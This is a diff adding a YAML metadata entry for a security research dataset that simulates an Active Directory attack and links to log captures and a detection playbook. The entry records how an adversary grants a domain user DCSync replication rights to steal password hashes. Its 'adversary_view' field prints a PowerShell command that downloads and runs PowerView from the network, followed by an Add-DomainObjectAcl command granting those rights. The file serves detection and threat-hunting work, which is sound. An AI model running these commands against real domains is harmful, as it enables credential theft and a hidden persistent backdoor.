@@ -1,0 +1,52 @@
+id: 190301-ADObjectACL-DSReplication
+title: Directory Replication Permissions Granted to AD User
+description: These datasets represent adversaries with enough permissions (i.e. domain admin) adding an access control entry (ACE) to the discretionary access control list (DACL) of an Active Directory object (i.e Root Domain). One example could be adversaries modifying the root domain DACL to allow a specific domain user, despite being in no privileged groups and not having local admin rights on the domain controller itself, to use Active Directory replication services and obtain secret domain data (i.e. Other user NTLM Hashes)
+
+collaborators:
+- Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/03/01
+modification_date: 2020/09/20
+platform:
+- Windows
+type: atomic
+tags:
+  - AD Object Modification
+  - AD Object nTSecurityDescriptor 
+  - LDAP ModifyRequest
+
+attack_mappings:
+  - technique: T1222
+    sub-technique: "001"
+    tactics:
+      - TA0005
+
+datasets:
+  endpoint:
+    - log_source: Microsoft-Windows-Sysmon
+      size: 13.02 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_powerview_ldap_ntsecuritydescriptor.zip
+    - log_source: Microsoft-Windows-Security-Auditing
+      size: 190.57 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/network/empire_powerview_ldap_ntsecuritydescriptor.zip
+  network:
+    - log_source: Wireshark
+      size: 3.43 MB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/network/empire_powerview_ldap_ntsecuritydescriptor.zip
+
+simulation:
+  environment: Blacksmith
+  tools:
+    - type: C2
+      name: Empire
+      module: powerview
+      script: https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1
+  permissions_required:
+    - Domain Admin
+  adversary_view: |-
+    PS C:\Windows\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1')
+    PS C:\Windows\system32> Add-DomainObjectAcl -TargetIdentity "dc=mssentinel,dc=local" -TargetDomain mssentinel.local -PrincipalIdentity nmartha -Rights DCSync
+
+detection:
+  - project: Threat Hunter Playbook
+    name: Active Directory Replication User Backdoor
+    link: https://threathunterplaybook.com/hunts/windows/190101-ADModDirectoryReplication/notebook.html
